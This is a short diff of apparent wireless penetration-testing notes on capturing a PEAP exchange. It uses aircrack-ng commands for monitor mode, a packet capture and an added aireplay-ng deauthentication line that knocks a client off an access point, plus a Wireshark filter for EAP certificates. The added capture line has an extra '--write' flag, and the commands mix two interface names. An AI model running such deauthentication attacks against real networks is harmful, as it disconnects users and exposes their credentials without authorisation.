@@ -27,7 +27,8 @@ PEAP EXCHANGE
 airmon-ng check kill
 airmon-ng start wlan0
 airodump-ng wlan0mon
-airodump-ng -c 2 -w Playtronics --output-format pcap wlan0mon
+airodump-ng -c 2 -w Playtronics --output-format pcap --write  wlan0mon
+aireplay-ng -0 1 -a <AP MAC> -c <client MAC> mon0 [Capture Handshake file]
 
 wlan.bssid==<bssid>  && eap && tls.handshake.certificate (Open in Wireshark and add filter)
 
